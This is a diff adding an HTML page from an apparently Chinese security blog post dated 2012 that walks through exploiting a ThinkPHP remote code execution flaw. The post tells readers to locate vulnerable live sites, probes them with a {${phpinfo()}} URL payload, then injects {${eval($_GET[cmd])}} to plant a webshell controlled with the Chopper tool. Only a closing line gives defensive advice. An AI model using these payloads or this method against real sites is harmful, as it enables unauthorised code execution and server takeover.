@@ -1,0 +1,214 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>ThinkPHP远程执行漏洞利用 | Return&#39;s Blog </title>
+  <meta name="author" content="Return">
+  
+  <meta name="description" content="专注于互联网开发技术，注重网络安全技术，注重网络攻防技术，注重渗透测试技术，backtrack5渗透测试平台研究，软件开发，网页设计，网页制作，网站建设">
+  
+  
+  <meta property="og:title" content="ThinkPHP远程执行漏洞利用"/>
+  <meta property="og:site_name" content="Return&#39;s Blog "/>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta property="og:image" content="undefined"/>
+  
+   <link rel="apple-touch-icon" href="/icon.png" />
+   <link rel="shortcut icon" href="/favicon.png" >
+   <link rel="alternate" href="http://www.creturn.com/atom.xml" title="Return&#39;s Blog " type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.8/jquery.min.js"></script>
+</head>
+
+
+<body>
+  <div id="content" class="inner">
+    <aside id="sidebar" class="alignleft">
+      <div class="navigationBar">
+        <a href="/">Return&#39;s Blog </a>
+      </div>
+    	
+  <nav class="widget" id="menu">
+	<ul>
+    
+      <li class="cell"><a class="next" href="/">Home</a><li>
+    
+      <li class="cell"><a class="next" href="/archives/">Archives</a><li>
+    
+      <li class="cell"><a class="next" href="/about/">About</a><li>
+    
+    </ul>
+</nav>
+
+  
+<div class="widget tag">
+  <h3 class="title">分类</h3>
+  <ul class="entry">
+  
+    <li><a href="/categories/原创作品/">原创作品</a><small>30</small></li>
+  
+    <li><a href="/categories/原创作品/技术文章/">技术文章</a><small>23</small></li>
+  
+    <li><a href="/categories/技术文章/">技术文章</a><small>7</small></li>
+  
+    <li><a href="/categories/原创作品/技术文章/最新漏洞/">最新漏洞</a><small>3</small></li>
+  
+    <li><a href="/categories/技术文章/最新漏洞/">最新漏洞</a><small>2</small></li>
+  
+    <li><a href="/categories/最新漏洞/">最新漏洞</a><small>1</small></li>
+  
+  </ul>
+</div>
+
+
+  
+<div class="widget tagcloud">
+  <h3 class="title">标签云</h3>
+  <div class="entry">
+    <a href="/tags/Android/" style="font-size: 10.00px;">Android</a><a href="/tags/Backtrack5/" style="font-size: 10.00px;">Backtrack5</a><a href="/tags/Metasploit/" style="font-size: 10.00px;">Metasploit</a><a href="/tags/Mysql/" style="font-size: 10.00px;">Mysql</a><a href="/tags/Nginx解析漏洞/" style="font-size: 10.00px;">Nginx解析漏洞</a><a href="/tags/Return/" style="font-size: 10.00px;">Return</a><a href="/tags/ThinkPHP远程/" style="font-size: 10.00px;">ThinkPHP远程</a><a href="/tags/alfred/" style="font-size: 10.00px;">alfred</a><a href="/tags/android/" style="font-size: 13.33px;">android</a><a href="/tags/apache/" style="font-size: 10.00px;">apache</a><a href="/tags/armitage/" style="font-size: 10.00px;">armitage</a><a href="/tags/arp欺骗/" style="font-size: 10.00px;">arp欺骗</a><a href="/tags/cain/" style="font-size: 10.00px;">cain</a><a href="/tags/dedecms漏洞/" style="font-size: 10.00px;">dedecms漏洞</a><a href="/tags/easyui/" style="font-size: 10.00px;">easyui</a><a href="/tags/eclipse/" style="font-size: 10.00px;">eclipse</a><a href="/tags/java/" style="font-size: 10.00px;">java</a><a href="/tags/linux arp欺骗/" style="font-size: 10.00px;">linux arp欺骗</a><a href="/tags/os x/" style="font-size: 10.00px;">os x</a><a href="/tags/php/" style="font-size: 13.33px;">php</a><a href="/tags/phpcmsv9漏洞/" style="font-size: 16.67px;">phpcmsv9漏洞</a><a href="/tags/phpcsm2008漏洞/" style="font-size: 10.00px;">phpcsm2008漏洞</a><a href="/tags/python/" style="font-size: 13.33px;">python</a><a href="/tags/thinkPHP漏洞/" style="font-size: 10.00px;">thinkPHP漏洞</a><a href="/tags/ubuntu/" style="font-size: 10.00px;">ubuntu</a><a href="/tags/web wifi认证/" style="font-size: 10.00px;">web wifi认证</a><a href="/tags/webshell/" style="font-size: 20.00px;">webshell</a><a href="/tags/window密码/" style="font-size: 10.00px;">window密码</a><a href="/tags/wordpress漏洞/" style="font-size: 13.33px;">wordpress漏洞</a><a href="/tags/workflow/" style="font-size: 10.00px;">workflow</a><a href="/tags/xUtils/" style="font-size: 10.00px;">xUtils</a><a href="/tags/互联网技术/" style="font-size: 10.00px;">互联网技术</a><a href="/tags/任意密码登录/" style="font-size: 10.00px;">任意密码登录</a><a href="/tags/任意读取文件漏洞/" style="font-size: 10.00px;">任意读取文件漏洞</a><a href="/tags/入侵/" style="font-size: 10.00px;">入侵</a><a href="/tags/后门/" style="font-size: 20.00px;">后门</a><a href="/tags/嗅探/" style="font-size: 10.00px;">嗅探</a><a href="/tags/图马/" style="font-size: 10.00px;">图马</a><a href="/tags/打飞机/" style="font-size: 10.00px;">打飞机</a><a href="/tags/注入漏洞/" style="font-size: 10.00px;">注入漏洞</a>
+  </div>
+</div>
+
+
+    	<footer id="footer" class="inner"><div class="copyright">
+  
+  &copy; 2014 Return
+  
+</div>
+
+
+<div style="position:relative; bottom: 23px">
+  <script src="http://s95.cnzz.com/stat.php?id=4287542&web_id=4287542&show=pic1" language="JavaScript">
+  </script>
+</div>
+
+
+</footer>
+    </aside>
+    
+    
+    <div id="hidden-navigationBar" class="navigationBar">
+      <a href="/">Return&#39;s Blog </a>
+    </div>
+    <div id="main-col" class="alignright">
+    <div id="wrapper">
+      
+<article class="post">
+  
+    <div class="gallery">
+  <div class="photoset">
+    
+      <img src="">
+    
+  </div>
+  <div class="control">
+    <div class="prev"></div>
+    <div class="next"></div>
+  </div>
+</div>
+  
+  <div class="post-content">
+  <header>
+      
+      
+  
+    <h1 class="title">ThinkPHP远程执行漏洞利用</h1>
+  
+
+      <time datetime="2012-07-05T16:56:10.000Z"><a href="/html/2012-07-06-ThinkPHP远程执行漏洞利用.html">7月 6 2012</a></time>
+      
+  </header>
+    <div class="entry">
+      
+        <p>睡前一篇文章已经成为习惯，今天就给大家展示一个thinkphp漏洞的利用，其实这个漏洞已经爆出来很久了。只不过很少有人发布这样的文章而已。</p>
+<p>先说下ThinkPHP的url规则,这个url规则是thinkPHP默认规则，当然也可以通过路由重写来实现各种你想要的效果。先看看ThinkPHP默认的规则：</p>
+<blockquote>
+<p><a href="http://www.creturn.com/index.php/news/view/1" target="_blank">http://www.creturn.com/index.php/news/view/1</a></p>
+</blockquote>
+<p>分析下这个url</p>
+<blockquote>
+<p><a href="http://www.creturn.com/index.php" target="_blank">http://www.creturn.com/index.php</a>  这个是入口</p>
+<p>/news/view/1  其中第一个参数news是指ThinkPHP中的模块，view指的是ThinkPHP中的方法，而后面的参数1则是参数。而漏洞恰巧出在对参数过滤不严格上面了。导致可以提交php方法上去远程执行。</p>
+</blockquote>
+<p>还是事例来进行演示：</p>
+<p>先找一个有thinkPHP漏洞的站点，具体怎么找就不说了。因为ThinkPHP在国内PHP框架中使用的还是比较广泛的，所以存在漏洞的站点，尤其很多大型站点都采用了ThinkPHP框架</p>
+<p>据我了解不少游戏官网就是用thinkPHP作为底层开发框架的。好了不废话了看图。</p>
+<p>在存在漏洞的页面中输入:www.creturn.com/index.php/fuck
+<a id="more"></a>
+好吧，为什么是fuck？前面已经说了第一个参数是模块那么系统肯定找不到模块的，所以出错信息：</p>
+<p><a href="http://www.creturn.com/asset/uploads/2012/07/think1.png" target="_blank"><img src="http://www.creturn.com/asset/uploads/2012/07/think1.png" alt="" title="think1"></a></p>
+<p>可以看到是thinkPHP框架</p>
+<p>那么测试一下站点是否存在远程执行漏洞。</p>
+<p>注意你的参数不要远程执行命令不能直接卸载index.php 后面的两个参数，最少要是第三个，前面已经说了第一个参数是模块，第二个参数是是方法。而从第三个开始是参数，因为此漏洞就是对参数过滤不严格并且导致可执行远程命令</p>
+<p>找到一个这样的连接:</p>
+<blockquote>
+<p><a href="http://www.creturn.com/index.php/article/show/id/116" target="_blank">http://www.creturn.com/index.php/article/show/id/116</a></p>
+</blockquote>
+<p>很明显可以看到他id后面跟的一个116.用漏洞命令替换它看看是否存在漏洞</p>
+<p>远程执行命令参数{${PHP代码}}，替换后就是：</p>
+<blockquote>
+<p><a href="http://www.creturn.com/index.php/article/show/id/{${phpinfo()}}" target="_blank">http://www.creturn.com/index.php/article/show/id/{${phpinfo()}}</a>  加一个PHP的探针</p>
+</blockquote>
+<p>测试下看是否能够执行此命令：</p>
+<p><a href="http://www.creturn.com/asset/uploads/2012/07/think2.png" target="_blank"><img src="http://www.creturn.com/asset/uploads/2012/07/think2.png" alt="" title="think2"></a></p>
+<p>可以看到已经解析了。那么就证明此站点存在远程执行漏洞，那么我们可以直接写入菜刀的一句话：</p>
+<p>一句话命令：{${eval($_GET[cmd])}} 替换之前的命令然后用菜刀连接</p>
+<blockquote>
+<p>地址为：<a href="http://www.creturn.com/index.php/article/show/id/{${eval($_GET[cmd])}}" target="_blank">http://www.creturn.com/index.php/article/show/id/{${eval($_GET[cmd])}}</a></p>
+</blockquote>
+<p>菜刀连接看下效果：</p>
+<p><a href="http://www.creturn.com/asset/uploads/2012/07/think3.png" target="_blank"><img src="http://www.creturn.com/asset/uploads/2012/07/think3.png" alt="" title="think3"></a></p>
+<p>好吧，就到这里。上面的真实地址我都替换掉了，目的只是演示thinkPHP远程执行命令的方法。还有就是提醒各位使用thinkphp框架的朋友，开发完东西后记住把debug模式关掉要不然很容以就看出是thinkphp的框架。</p>
+
+	 
+	     <p style="margin:20px 0; color:#9f9f9f; font-size:12px;">
+<span>Posted by <a style="color:#9f9f9f;" href="null"><strong>creturn</strong></a> - 7月 6 2012</span><br />
+<span style="line-height:13px;">如需转载，请注明： 本文来自 <a style="color:#9f9f9f;" href="http://creturn.com"><strong>Return&#39;s Blog </strong></a></span>
+</p>
+       	 
+      
+    </div>
+    <footer>
+      
+	 
+     		  
+  
+  <div class="categories">
+    <a href="/categories/原创作品/">原创作品</a>, <a href="/categories/原创作品/技术文章/">技术文章</a>
+  </div>
+
+       		
+  
+  <div class="tags">
+    <a href="/tags/thinkPHP漏洞/">thinkPHP漏洞</a>
+  </div>
+
+     		  
+       	 
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+</div>
+    </div>
+    <div class="tabbar" onload="divideTabBar()">
+	
+      <div class="tabbaritem"><a class="next" href="/">Home</a></div>
+    
+      <div class="tabbaritem"><a class="next" href="/archives/">Archives</a></div>
+    
+      <div class="tabbaritem"><a class="next" href="/about/">About</a></div>
+    
+</div>
+
+
+  </div>
+</body>
+</html>
